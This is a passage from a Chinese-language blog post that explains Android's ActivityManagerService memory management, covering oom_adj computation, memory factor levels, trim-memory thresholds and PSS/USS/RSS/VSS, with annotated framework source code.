class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure><p>3.3 调用 applyOomAdjLocked 设置进程的 oom</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计算完毕之后，进行设置app的oom</span></span><br><span class="line"> <span class="keyword">for</span> (<span class="type">int</span> i=N<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line">     ProcessRecord app = mLruProcesses.get(i);</span><br><span class="line">     <span class="keyword">if</span> (!app.killedByAm &amp;&amp; app.thread != null) &#123;</span><br><span class="line">         applyOomAdjLocked(app, <span class="literal">true</span>, now, nowElapsed);</span><br><span class="line"></span><br><span class="line">         <span class="comment">//计算各个类型进程的数量</span></span><br><span class="line">         <span class="keyword">switch</span> (app.curProcState) &#123;</span><br><span class="line">             <span class="keyword">case</span> ActivityManager.PROCESS_STATE_CACHED_ACTIVITY:</span><br><span class="line">                 mNumCachedHiddenProcs++;</span><br><span class="line">                 numCached++;</span><br><span class="line">                 <span class="comment">//超过限制，杀进程回收资源</span></span><br><span class="line">                 <span class="keyword">if</span> (numCached &gt; cachedProcessLimit) &#123;</span><br><span class="line">                     app.kill(<span class="string">&quot;cached #&quot;</span> + numCached, <span class="literal">true</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">             <span class="keyword">case</span> ActivityManager.PROCESS_STATE_CACHED_EMPTY:</span><br><span class="line">                 <span class="comment">//超过限制，杀进程回收资源</span></span><br><span class="line">                 <span class="keyword">if</span> (numEmpty &gt; mConstants.CUR_TRIM_EMPTY_PROCESSES</span><br><span class="line">                         &amp;&amp; app.lastActivityTime &lt; oldTime) &#123;</span><br><span class="line">                     app.kill(<span class="string">&quot;empty for &quot;</span></span><br><span class="line">                             + ((oldTime + ProcessList.MAX_EMPTY_TIME - app.lastActivityTime) / <span class="number">1000</span>) + <span class="string">&quot;s&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">                 &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     numEmpty++;</span><br><span class="line">                     <span class="keyword">if</span> (numEmpty &gt; emptyProcessLimit) &#123;</span><br><span class="line">                         app.kill(<span class="string">&quot;empty #&quot;</span> + numEmpty, <span class="literal">true</span>);</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">             <span class="keyword">default</span>:</span><br><span class="line">                 mNumNonCachedProcs++;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          ...</span><br><span class="line">          <span class="keyword">if</span> (app.curProcState &gt;= ActivityManager.PROCESS_STATE_HOME</span><br><span class="line">                 &amp;&amp; !app.killedByAm) &#123;</span><br><span class="line">             numTrimming++;<span class="comment">//重要性低于Home的进程</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>1.1 当执行完上述代码后，根据执行结果设置当前的内存等级，并根据当前的内存等级主动去回收内存</p><ul><li><p>public static final int ADJ_MEM_FACTOR_NORMAL=0;// 正常等级</p></li><li><p>public static final int ADJ_MEM_FACTOR_MODERATE=1;// 中等等级</p></li><li><p>public static final int ADJ_MEM_FACTOR_LOW=2;// 存在低内存</p></li><li><p>public static final int ADJ_MEM_FACTOR_CRITICAL=3;// 严重低内存</p></li></ul><p>对应的更细节的内存回收策略如下：</p><ul><li><p>TRIM_MEEMORY_COMPLETTE=80</p></li><li><p>TRIM_MEEMORY_MODERATE=60</p></li><li><p>TRIM_MEEMORY_BACKGROUND=40</p></li><li><p>TRIM_MEEMORY_UI_HIDDEN=20</p></li><li><p>TRIM_MEEMORY_RUNNING_CRITICAL=15，对应 ADJ_MEM_FACTOR_CRITICAL</p></li><li><p>TRIM_MEEMORY_RUNNING_LOW=10，对应 ADJ_MEM_FACTOR_LOW</p></li><li><p>TRIM_MEEMORY_RUNNING_MODERATE=5，对应 ADJ_MEM_FACTOR_MODERATE 和 ADJ_MEM_FACTOR_NORMAL</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">        mNumServiceProcs = mNewNumServiceProcs;</span><br><span class="line">        final <span class="type">int</span> numCachedAndEmpty = numCached + numEmpty;<span class="comment">//缓存进程和空进程的数量和</span></span><br><span class="line">        <span class="type">int</span> memFactor;<span class="comment">//内存等级计算因子</span></span><br><span class="line">        <span class="keyword">if</span> (numCached &lt;= mConstants.CUR_TRIM_CACHED_PROCESSES</span><br><span class="line">                &amp;&amp; numEmpty &lt;= mConstants.CUR_TRIM_EMPTY_PROCESSES) &#123;<span class="comment">//缓存进程和空进程的数量都低于对应的规定阀值</span></span><br><span class="line">            <span class="keyword">if</span> (numCachedAndEmpty &lt;= ProcessList.TRIM_CRITICAL_THRESHOLD) &#123;<span class="comment">//同时他们的总和低于极端情况下的阀值</span></span><br><span class="line">                <span class="comment">//缓存进程和空进程的数量很少，并且总和也很少，此情况很极端</span></span><br><span class="line">                memFactor = ProcessStats.ADJ_MEM_FACTOR_CRITICAL;<span class="comment">//设置内存等级严重</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (numCachedAndEmpty &lt;= ProcessList.TRIM_LOW_THRESHOLD) &#123;</span><br><span class="line">                <span class="comment">//缓存进程和空进程的数量很少，但总和还行，我们认为此时的情况仅次于极端情况</span></span><br><span class="line">                memFactor = ProcessStats.ADJ_MEM_FACTOR_LOW;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//缓存进程和空进程的数量很少，但总和不错，认为该情况为中级</span></span><br><span class="line">                memFactor = ProcessStats.ADJ_MEM_FACTOR_MODERATE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">//缓存进程和空进程的数量正常，该情况为正常</span></span><br><span class="line">            memFactor = ProcessStats.ADJ_MEM_FACTOR_NORMAL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG_OOM_ADJ) Slog.d(TAG_OOM_ADJ, <span class="string">&quot;oom: memFactor=&quot;</span> + memFactor</span><br><span class="line">                + <span class="string">&quot; last=&quot;</span> + mLastMemoryLevel + <span class="string">&quot; allowLow=&quot;</span> + mAllowLowerMemLevel</span><br><span class="line">                + <span class="string">&quot; numProcs=&quot;</span> + mLruProcesses.size() + <span class="string">&quot; last=&quot;</span> + mLastNumProcesses);</span><br><span class="line">        <span class="comment">//memFactor取值在0-3之间，越大代表内存越紧张</span></span><br><span class="line">        <span class="keyword">if</span> (memFactor &gt; mLastMemoryLevel) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!mAllowLowerMemLevel || mLruProcesses.size() &gt;= mLastNumProcesses) &#123;</span><br><span class="line">                memFactor = mLastMemoryLevel;</span><br><span class="line">                <span class="keyword">if</span> (DEBUG_OOM_ADJ) Slog.d(TAG_OOM_ADJ, <span class="string">&quot;Keeping last mem factor!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (memFactor != mLastMemoryLevel) &#123;</span><br><span class="line">            EventLogTags.writeAmMemFactor(memFactor, mLastMemoryLevel);</span><br><span class="line">        &#125;</span><br><span class="line">        mLastMemoryLevel = memFactor;</span><br><span class="line">        mLastNumProcesses = mLruProcesses.size();</span><br><span class="line">        <span class="comment">//设置内存等级成功返回true</span></span><br><span class="line">        boolean allChanged = mProcessStats.setMemFactorLocked(memFactor, !isSleepingLocked(), now);</span><br><span class="line">        final <span class="type">int</span> trackerMemFactor = mProcessStats.getMemFactorLocked();</span><br><span class="line">        <span class="keyword">if</span> (memFactor != ProcessStats.ADJ_MEM_FACTOR_NORMAL) &#123;<span class="comment">//当前的内存等级不正常</span></span><br><span class="line">            <span class="keyword">if</span> (mLowRamStartTime == <span class="number">0</span>) &#123;</span><br><span class="line">                mLowRamStartTime = now;<span class="comment">//记录时间</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> step = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> fgTrimLevel;</span><br><span class="line">            <span class="keyword">switch</span> (memFactor) &#123;</span><br><span class="line">                <span class="keyword">case</span> ProcessStats.ADJ_MEM_FACTOR_CRITICAL:</span><br><span class="line">                    fgTrimLevel = ComponentCallbacks2.TRIM_MEMORY_RUNNING_CRITICAL;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> ProcessStats.ADJ_MEM_FACTOR_LOW:</span><br><span class="line">                    fgTrimLevel = ComponentCallbacks2.TRIM_MEMORY_RUNNING_LOW;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    fgTrimLevel = ComponentCallbacks2.TRIM_MEMORY_RUNNING_MODERATE;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> factor = numTrimming/<span class="number">3</span>;<span class="comment">//原理同上</span></span><br><span class="line">            <span class="type">int</span> minFactor = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (mHomeProcess != null) minFactor++;</span><br><span class="line">            <span class="keyword">if</span> (mPreviousProcess != null) minFactor++;</span><br><span class="line">            <span class="keyword">if</span> (factor &lt; minFactor) factor = minFactor;</span><br><span class="line">            <span class="type">int</span> curLevel = ComponentCallbacks2.TRIM_MEMORY_COMPLETE;</span><br><span class="line"><span class="comment">//默认设置最高的回收等级</span></span><br><span class="line">            <span class="comment">//这个循环为逆序遍历。因为LRU集合中越在后面的进程，优先级越高，代表用户使用的频率高 </span></span><br><span class="line">            <span class="comment">//该进程在LRU集合的位置就越靠后，也就意味着其占有的内存也较多，因此他就越需要进行内存回收。</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=N<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line">                ProcessRecord app = mLruProcesses.get(i);</span><br><span class="line">                <span class="keyword">if</span> (allChanged || app.procStateChanged) &#123;</span><br><span class="line">                    setProcessTrackerStateLocked(app, trackerMemFactor, now);</span><br><span class="line">                    app.procStateChanged = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (app.curProcState &gt;= ActivityManager.PROCESS_STATE_HOME</span><br><span class="line">                        &amp;&amp; !app.killedByAm) &#123;<span class="comment">//procstate &gt;= 13</span></span><br><span class="line">                    <span class="comment">//进程优先级大于Home进程，也可以认为adj&gt;=600，也就是相对于用户重要程度低于Home进程</span></span><br><span class="line">                    <span class="keyword">if</span> (app.trimMemoryLevel &lt; curLevel &amp;&amp; app.thread != null) &#123;</span><br><span class="line">                        <span class="comment">//当前进程的内存回收等级小于当前的内存回收等级，说明之前内存情况较好，现在需要进行内存回收</span></span><br><span class="line">                        try &#123;</span><br><span class="line">                            <span class="keyword">if</span> (DEBUG_SWITCH || DEBUG_OOM_ADJ) Slog.v(TAG_OOM_ADJ,</span><br><span class="line">                                    <span class="string">&quot;Trimming memory of &quot;</span> + app.processName + <span class="string">&quot; to &quot;</span> + curLevel);</span><br><span class="line">                            app.thread.scheduleTrimMemory(curLevel);</span><br><span class="line">                        &#125; catch (RemoteException e) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                        ...</span><br><span class="line"></span><br><span class="line">                    app.trimMemoryLevel = curLevel;</span><br><span class="line">                    step++;</span><br><span class="line">                    <span class="keyword">if</span> (step &gt;= factor) &#123;<span class="comment">//回收一定程度(即处理完一个slot之后)，按需要降低内存回收等级</span></span><br><span class="line">                        step = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">switch</span> (curLevel) &#123;</span><br><span class="line">                            <span class="keyword">case</span> ComponentCallbacks2.TRIM_MEMORY_COMPLETE:</span><br><span class="line">                                curLevel = ComponentCallbacks2.TRIM_MEMORY_MODERATE;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            <span class="keyword">case</span> ComponentCallbacks2.TRIM_MEMORY_MODERATE:</span><br><span class="line">                                curLevel = ComponentCallbacks2.TRIM_MEMORY_BACKGROUND;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; </span><br><span class="line">                ...</span><br></pre></td></tr></table></figure><p>3.5 重新计算进程的 PSS 值，外加一些额外的结束工作</p><table><thead><tr><th>Item</th><th>全称</th><th>含义</th><th>等价</th></tr></thead><tbody><tr><td>USS</td><td>Unique Set Size</td><td>物理内存</td><td>进程独占的内存</td></tr><tr><td>PSS</td><td>Proportional Set Size</td><td>物理内存</td><td>PSS=USS + 按比例包含共享库</td></tr><tr><td>RSS</td><td>Resident Set Size</td><td>物理内存</td><td>RSS=USS + 包含共享库</td></tr><tr><td>VSS</td><td>Virtual Set Size</td><td>虚拟内存</td><td>VSS=RSS + 未分配实际物理内存</td></tr></tbody></table><p>以 SystemUI 进程来说：</p><ul><li><p>USS：SytemUI 进程实际占用的物理内存</p></li><li><p>PSS：SystemUI 进程实际占用的物理内存加上 SystemUI 的共享库占用的内存</p></li><li><p>RSS：SystemUI 进程实际占用的物理内存加上所有共享库占用的内存</p></li><li><p>VSS：通常不关注</p></li></ul><p>一般来说内存占用大小有如下规律：VSS&gt;=RSS&gt;=PSS&gt;=USS</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mAlwaysFinishActivities) &#123;</span><br><span class="line">    mStackSupervisor.scheduleDestroyAllActivities(null, <span class="string">&quot;always-finish&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">ArrayList&lt;UidRecord&gt; becameIdle = null;</span><br><span class="line"><span class="keyword">if</span> (mLocalPowerManager != null) &#123;</span><br><span class="line">    mLocalPowerManager.startUidChanges();</span><br><span class="line">&#125;</span><br><span class="line"> ...</span><br><span class="line"><span class="keyword">if</span> (becameIdle != null) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = becameIdle.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        mServices.stopInBackgroundLocked(becameIdle.get(i).uid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="4-computeoomadjlocked方法"><a class="markdownIt-Anchor" href="#4-computeoomadjlocked方法">#</a> 4. computeOomAdjLocked 方法</h3><p>​computeOomAdjLocked 函数根据一定规则计算出三个状态值，这个规则与 Android 将进程划分的 5 个优先级有关系，即前台进程、可见进程、服务进程、后台进程、空进程。下面我们对 computeOomAdjLocked 函数进行分段研究。</p><p>4.1 根据参数及进程的状态，决定是否需要进行后续的计算，并初始化一些变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">computeOomAdjLocked</span><span class="params">(ProcessRecord app, <span class="type">int</span> cachedAdj, ProcessRecord TOP_APP,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> doingAll, <span class="type">long</span> now)</span> &#123;</span><br><span class="line">    <span class="comment">//updateOomAdjLocked函数每次更新oom_adj时，都会分配一个序号</span></span><br><span class="line">    <span class="comment">//此处就是根据序号判断是否已经处理过命令</span></span><br><span class="line">    <span class="keyword">if</span> (mAdjSeq == app.adjSeq) &#123;</span><br><span class="line">        <span class="comment">// This adjustment has already been computed.</span></span><br><span class="line">        <span class="keyword">return</span> app.curRawAdj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ProcessRecord对应的ActivityThread不存在了</span></span><br><span class="line">    <span class="comment">//修改其中的一些变量，此时的oom_adj为CACHED_APP_MAX_ADJ，</span></span><br><span class="line">    <span class="keyword">if</span> (app.thread == <span class="literal">null</span>) &#123;</span><br><span class="line">        app.adjSeq = mAdjSeq;</span><br><span class="line">        app.curSchedGroup = ProcessList.SCHED_GROUP_BACKGROUND;</span><br><span class="line">        app.curProcState = ActivityManager.PROCESS_STATE_CACHED_EMPTY;</span><br><span class="line">        <span class="keyword">return</span> (app.curAdj=app.curRawAdj=ProcessList.CACHED_APP_MAX_ADJ);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化一些变量</span></span><br><span class="line">    app.adjTypeCode = ActivityManager.RunningAppProcessInfo.REASON_UNKNOWN;</span><br><span class="line">    app.adjSource = <span class="literal">null</span>;</span><br><span class="line">    app.adjTarget = <span class="literal">null</span>;</span><br><span class="line">    app.empty = <span class="literal">false</span>;</span><br><span class="line">    app.cached = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">activitiesSize</span> <span class="operator">=</span> app.activities.size();</span><br><span class="line">    <span class="comment">// ProcessRecord中只有初始化时为maxAdj赋值</span></span><br><span class="line">    <span class="comment">//maxAdj取值为UNKNOWN_ADJ，即最大的1001</span></span><br><span class="line">    <span class="keyword">if</span> (app.maxAdj &lt;= ProcessList.FOREGROUND_APP_ADJ) &#123;</span><br><span class="line">        <span class="comment">//这部分代码就是修改app的curSchedGroup，并将oom_adj设置为maxAdj</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//保存当前TOP Activity的状态</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PROCESS_STATE_CUR_TOP</span> <span class="operator">=</span> mTopProcessState;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.2 1.1 这部分代码包含前台 Activity 的进程，运行测试类的进程、处理广播的进程以及包含正在运行服务的进程，其中 oom_adj 都被赋值为 FOREGROUND_APP_ADJ。从 LMK 的角度看，它们的重要性是一致的，但这些进程的 proState 不同，于是从 AMS 主动回收内存的角度来看，它们的重要性不同。</p><p>对于其它种类的进程，这部分代码先将它们的 oom_adj 设置为 UNKNOW_ADJ，proc_state 设置为 PROCESS_STATE_CACHED_EMPTY，在后续的流程中再作进一步处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">int</span> adj;</span><br><span class="line"><span class="type">int</span> schedGroup;</span><br><span class="line"><span class="type">int</span> procState;</span><br><span class="line">boolean foregroundActivities = <span class="literal">false</span>;</span><br><span class="line">BroadcastQueue <span class="built_in">queue</span>;</span><br><span class="line"><span class="comment">//若进程包含正在前台显示的Activity</span></span><br><span class="line"><span class="keyword">if</span> (app == TOP_APP) &#123;</span><br><span class="line">    <span class="comment">// The last app on the list is the foreground app.</span></span><br><span class="line">    adj = ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">    <span class="comment">//单独的一种schedGroup</span></span><br><span class="line">    schedGroup = ProcessList.SCHED_GROUP_TOP_APP;</span><br><span class="line">    app.adjType = <span class="string">&quot;top-activity&quot;</span>;</span><br><span class="line">    <span class="comment">//当前处理的是包含前台Activity的进程时，才会将该值置为true</span></span><br><span class="line">    foregroundActivities = <span class="literal">true</span>;</span><br><span class="line">    procState = PROCESS_STATE_CUR_TOP;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (app.instrumentationClass != null) &#123;</span><br><span class="line">    <span class="comment">//处理正在进行测试的进程</span></span><br><span class="line">    <span class="comment">// Don&#x27;t want to kill running instrumentation.</span></span><br><span class="line">    adj = ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">    schedGroup = ProcessList.SCHED_GROUP_DEFAULT;</span><br><span class="line">    app.adjType = <span class="string">&quot;instrumentation&quot;</span>;</span><br><span class="line">    procState = ActivityManager.PROCESS_STATE_FOREGROUND_SERVICE;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="built_in">queue</span> = isReceivingBroadcast(app)) != null) &#123;</span><br><span class="line">    <span class="comment">//处理正在处理广播的进程</span></span><br><span class="line">    adj = ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">    <span class="comment">//根据处理广播的Queue，决定调度策略</span></span><br><span class="line">    schedGroup = (<span class="built_in">queue</span> == mFgBroadcastQueue)</span><br><span class="line">            ? ProcessList.SCHED_GROUP_DEFAULT : ProcessList.SCHED_GROUP_BACKGROUND;</span><br><span class="line">    app.adjType = <span class="string">&quot;broadcast&quot;</span>;</span><br><span class="line">    procState = ActivityManager.PROCESS_STATE_RECEIVER;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (app.executingServices.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//处理Service正在运行的进程</span></span><br><span class="line">    adj = ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">    schedGroup = app.execServicesFg ?</span><br><span class="line">            ProcessList.SCHED_GROUP_DEFAULT : ProcessList.SCHED_GROUP_BACKGROUND;</span><br><span class="line">    procState = ActivityManager.PROCESS_STATE_SERVICE;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//其它进程，在后续过程中再进一步处理  </span></span><br><span class="line">    <span class="comment">// 先将adj临时赋值为cachedAdj，即参数传入的UNKNOW_ADJ</span></span><br><span class="line">    adj = cachedAdj;</span><br><span class="line">    procState = ActivityManager.PROCESS_STATE_CACHED_EMPTY;</span><br><span class="line">    app.cached = <span class="literal">true</span>;</span><br><span class="line">    app.empty = <span class="literal">true</span>;</span><br><span class="line">    app.adjType = <span class="string">&quot;cch-empty&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>4.3  这部分代码主要处理包含 Activity，但是 Activity 不在前台的进程。注意到这些进程包括之前提到的正在处理广播、服务或测试的进程以及 oom_adj 暂时为 UNKNOW_ADJ 的进程。不过只有 UNKNOW_ADJ 对应的进程，才有可能进行实际的更新。进程中若存在可见 Activity 时，进程的 oom_adj 为 VISIBLE_APP_ADJ；否则若进程中存在处于 PAUSING、PAUSED 或 STOPPING 状态的 Activity 时，进程的 oom_adj 为 PERCEPTIBLE_APP_ADJ；其余的进程仍是 UNKNOW_ADJ。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (!foregroundActivities &amp;&amp; activitiesSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//rankTaskLayersIfNeeded函数会更新包含Activity的Task的rankLayer</span></span><br><span class="line">    <span class="comment">//按照显示层次从上到下，rankLayer逐渐增加，对应的最大值就是VISIBLE_APP_LAYER_MAX</span></span><br><span class="line">    <span class="type">int</span> minLayer = ProcessList.VISIBLE_APP_LAYER_MAX;</span><br><span class="line">    <span 